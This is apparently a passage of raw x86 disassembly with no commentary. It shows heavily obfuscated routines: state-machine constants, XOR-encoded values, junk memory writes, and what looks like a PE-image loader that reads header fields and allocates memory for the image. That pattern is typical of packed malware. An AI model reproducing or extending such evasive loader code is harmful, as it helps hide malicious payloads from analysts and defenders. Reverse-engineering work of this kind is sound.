  4289cd:	mov    eax,DWORD PTR [ebp-0x8]
  4289d0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4289d3:	xor    eax,edi
  4289d5:	add    eax,ebx
  4289d7:	imul   eax,ecx
  4289da:	mov    ecx,DWORD PTR [ebp+0x8]
  4289dd:	mov    edx,DWORD PTR [ebp-0x28]
  4289e0:	xor    ecx,edi
  4289e2:	lea    ecx,[ecx+edx*1+0x3272f1]
  4289e9:	cmp    eax,ecx
  4289eb:	jb     0x428649
  4289f1:	mov    esi,DWORD PTR [ebp+0x14]
  4289f4:	mov    eax,DWORD PTR [ebp-0x20]
  4289f7:	mov    DWORD PTR [esi],eax
  4289f9:	jmp    0x428a40
  4289fb:	mov    ecx,DWORD PTR [ebp+0x8]
  4289fe:	mov    edx,DWORD PTR [ebp+0xc]
  428a01:	xor    ecx,edi
  428a03:	xor    edx,edi
  428a05:	add    ecx,ebx
  428a07:	add    edx,ebx
  428a09:	cmp    ecx,edx
  428a0b:	jne    0x428a1f
  428a0d:	mov    eax,ds:0x7f642ddc
  428a12:	imul   eax,eax,0x9f15fccf
  428a18:	mov    ds:0x7f642ddc,eax
  428a1d:	jmp    0x428a40
  428a1f:	mov    ecx,DWORD PTR [ebp+0x8]
  428a22:	xor    ecx,edi
  428a24:	add    ecx,ebx
  428a26:	cmp    eax,ecx
  428a28:	je     0x428a36
  428a2a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428a34:	jmp    0x428a40
  428a36:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428a40:	pop    edi
  428a41:	pop    esi
  428a42:	pop    ebx
  428a43:	leave  
  428a44:	ret    0x18
  428a47:	push   ebp
  428a48:	mov    ebp,esp
  428a4a:	and    esp,0xfffffff8
  428a4d:	mov    eax,DWORD PTR [ebp+0x20]
  428a50:	sub    esp,0x14
  428a53:	push   ebx
  428a54:	mov    ebx,DWORD PTR [ebp+0x14]
  428a57:	push   esi
  428a58:	push   edi
  428a59:	cmp    eax,0xf89c85a5
  428a5e:	jne    0x428a6a
  428a60:	push   0xf89c85ba
  428a65:	jmp    0x428b9c
  428a6a:	mov    eax,DWORD PTR [ebp+0x20]
  428a6d:	cmp    eax,0xf89c85ba
  428a72:	jne    0x428a7e
  428a74:	push   0xf89c85bb
  428a79:	jmp    0x428b9c
  428a7e:	mov    eax,DWORD PTR [ebp+0x20]
  428a81:	cmp    eax,0xf89c85bb
  428a86:	jne    0x428a92
  428a88:	push   0xf89c85b8
  428a8d:	jmp    0x428b9c
  428a92:	mov    eax,DWORD PTR [ebp+0x20]
  428a95:	cmp    eax,0xf89c85b8
  428a9a:	jne    0x428aa6
  428a9c:	push   0xf89c85b9
  428aa1:	jmp    0x428b9c
  428aa6:	mov    ecx,DWORD PTR [ebp+0x20]
  428aa9:	mov    eax,0xf89c85bc
  428aae:	cmp    ecx,eax
  428ab0:	jne    0x428b6c
  428ab6:	mov    eax,DWORD PTR [ebp+0x10]
  428ab9:	mov    DWORD PTR [esp+0xc],eax
  428abd:	mov    eax,DWORD PTR [ebp+0x18]
  428ac0:	mov    DWORD PTR [esp+0x14],eax
  428ac4:	mov    eax,DWORD PTR [ebp+0xc]
  428ac7:	mov    DWORD PTR [esp+0x18],eax
  428acb:	mov    eax,DWORD PTR [ebp+0x8]
  428ace:	mov    DWORD PTR [esp+0x10],eax
  428ad2:	mov    eax,DWORD PTR [esp+0x10]
  428ad6:	mov    ecx,DWORD PTR [esp+0x14]
  428ada:	mov    edi,0x75108aa
  428adf:	xor    eax,edi
  428ae1:	mov    esi,0x3272f1
  428ae6:	add    eax,esi
  428ae8:	mov    DWORD PTR [ecx],eax
  428aea:	mov    eax,DWORD PTR [esp+0xc]
  428aee:	mov    eax,DWORD PTR [eax+0x194]
  428af4:	mov    ecx,DWORD PTR [eax]
  428af6:	mov    eax,DWORD PTR [esp+0xc]
  428afa:	mov    eax,DWORD PTR [eax+0x194]
  428b00:	mov    eax,DWORD PTR [eax]
  428b02:	add    eax,DWORD PTR [ecx+0x3c]
  428b05:	mov    ecx,DWORD PTR [esp+0xc]
  428b09:	mov    ecx,DWORD PTR [ecx+0x1e0]
  428b0f:	mov    ecx,DWORD PTR [ecx+0x14]
  428b12:	push   0x4
  428b14:	push   0x3000
  428b19:	push   DWORD PTR [eax+0x50]
  428b1c:	push   0x0
  428b1e:	call   ecx
  428b20:	mov    DWORD PTR [ebx],eax
  428b22:	mov    eax,DWORD PTR [esp+0x10]
  428b26:	push   DWORD PTR [esp+0xc]
  428b2a:	xor    eax,edi
  428b2c:	add    eax,esi
  428b2e:	mov    DWORD PTR [esp+0x20],eax
  428b32:	lea    eax,[esp+0x20]
  428b36:	push   eax
  428b37:	push   ebx
  428b38:	push   DWORD PTR [esp+0x20]
  428b3c:	push   DWORD PTR [esp+0x28]
  428b40:	push   DWORD PTR [esp+0x24]
  428b44:	call   0x428509
  428b49:	mov    eax,DWORD PTR [esp+0x10]
  428b4d:	mov    ecx,DWORD PTR [ebx]
  428b4f:	xor    eax,edi
  428b51:	add    eax,esi
  428b53:	cmp    ecx,eax
  428b55:	je     0x428bb3
  428b57:	mov    eax,DWORD PTR [esp+0x18]
  428b5b:	mov    ecx,DWORD PTR [esp+0x14]
  428b5f:	xor    eax,edi
  428b61:	add    eax,esi
  428b63:	imul   eax,DWORD PTR [esp+0x1c]
  428b68:	mov    DWORD PTR [ecx],eax
  428b6a:	jmp    0x428bb3
  428b6c:	mov    ecx,DWORD PTR [ebp+0x20]
  428b6f:	cmp    ecx,0xf89c85b9
  428b75:	jne    0x428b7e
  428b77:	push   0xf89c85be
  428b7c:	jmp    0x428b9c
  428b7e:	mov    ecx,DWORD PTR [ebp+0x20]
  428b81:	cmp    ecx,0xf89c85be
  428b87:	jne    0x428b90
  428b89:	push   0xf89c85bf
  428b8e:	jmp    0x428b9c
  428b90:	mov    ecx,DWORD PTR [ebp+0x20]
  428b93:	cmp    ecx,0xf89c85bf
  428b99:	jne    0x428bb3
  428b9b:	push   eax
  428b9c:	push   DWORD PTR [ebp+0x1c]
  428b9f:	push   DWORD PTR [ebp+0x18]
  428ba2:	push   ebx
  428ba3:	push   DWORD PTR [ebp+0x10]
  428ba6:	push   DWORD PTR [ebp+0xc]
  428ba9:	push   DWORD PTR [ebp+0x8]
  428bac:	call   0x428a47
  428bb1:	mov    DWORD PTR [ebx],eax
  428bb3:	mov    eax,DWORD PTR [ebx]
  428bb5:	pop    edi
  428bb6:	pop    esi
  428bb7:	pop    ebx
  428bb8:	mov    esp,ebp
  428bba:	pop    ebp
  428bbb:	ret    0x1c
  428bbe:	push   ebp
  428bbf:	mov    ebp,esp
  428bc1:	sub    esp,0xc
  428bc4:	mov    eax,0xf89c85a5
  428bc9:	mov    DWORD PTR [ebp-0x8],eax
  428bcc:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428bd3:	mov    ecx,DWORD PTR [ebp-0x8]
  428bd6:	xor    ecx,0x75108aa
  428bdc:	add    ecx,0x3272f1
  428be2:	mov    DWORD PTR [ebp-0x4],ecx
  428be5:	mov    ecx,DWORD PTR [ebp+0xc]
  428be8:	push   eax
  428be9:	mov    DWORD PTR [ebp+0xc],ecx
  428bec:	push   DWORD PTR [ebp+0xc]
  428bef:	lea    eax,[ebp-0x4]
  428bf2:	push   DWORD PTR [ebp+0x8]
  428bf5:	push   eax
  428bf6:	push   DWORD PTR [ebp+0xc]
  428bf9:	push   DWORD PTR [ebp-0xc]
  428bfc:	push   DWORD PTR [ebp-0x8]
  428bff:	call   0x428a47
  428c04:	mov    DWORD PTR [ebp-0x4],eax
  428c07:	mov    eax,DWORD PTR [ebp-0x4]
  428c0a:	leave  
  428c0b:	ret    0x8
